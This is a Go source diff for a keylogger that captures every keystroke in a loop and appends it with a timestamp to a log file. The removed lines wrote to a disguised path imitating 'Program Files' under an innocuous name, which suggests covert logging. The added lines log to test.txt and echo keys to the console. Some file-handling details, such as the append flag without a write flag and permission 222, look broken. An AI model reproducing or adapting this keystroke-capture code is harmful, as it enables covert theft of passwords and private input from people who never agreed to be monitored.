@@ -5,26 +5,9 @@ import(
 	"time"
 	"fmt"
 	"os"
-	"log"
-	"strconv"
 )
 
-func check(err error) {
-	if err != nil {
-		log.Fatal(err)
-	}
-}
-
-func strconverter(nb int) string {
-	return(strconv.Itoa(nb)) 
-}
-
-func gettimestring() string{
-	t := time.Now()
-	return(strconverter(t.Year())+"/"+t.Month().String()+"/"+strconverter(t.Day())+"|"+strconverter(t.Hour())+":"+strconverter(t.Minute())+":"+strconverter(t.Second()))
-}
-
-func exist(name string) bool {
+func Exists(name string) bool {
     if _, err := os.Stat(name); err != nil {
         if os.IsNotExist(err) {
             return false
@@ -33,18 +16,30 @@ func exist(name string) bool {
     return true
 }
 
-func main() {
-	if !exist("C:/Program Fles/Core640/corelg.txt") {
-		_, err := os.Create("C:/Program Fles/Core640/corelg.txt")
-		check(err)
+func getfileobj(name string) *os.File {
+	if Exists(name) {
+		f, err := os.OpenFile(name, os.O_APPEND, 222)
+		if err != nil {
+			os.Exit(1)
+		}
+		return(f) 
+	} else {
+		f, err2 := os.Create(name)
+		if err2 != nil {
+			os.Exit(2)
+		}
+		return(f)
 	}
-	kl := keys.NewKeylogger()	
+}
+
+func main() {
+	kl := keys.NewKeylogger()
+	f := getfileobj("test.txt")	
 	for {
 		key := kl.GetKey()
 		if !key.Empty {
-			f, err2 := os.OpenFile("C:/Program Fles/Core640/corelg.txt", os.O_APPEND,0644)
-			check(err2)
-			f.WriteString(gettimestring()+"  :   "+string(key.Rune)+"\n")
+			f.WriteString("'"+string(key.Rune)+"' 	["+time.Now().Format("2006-01-02 15:04:05")+"]\n")
+			fmt.Printf(string(key.Rune))
 		}
 	}	
 }
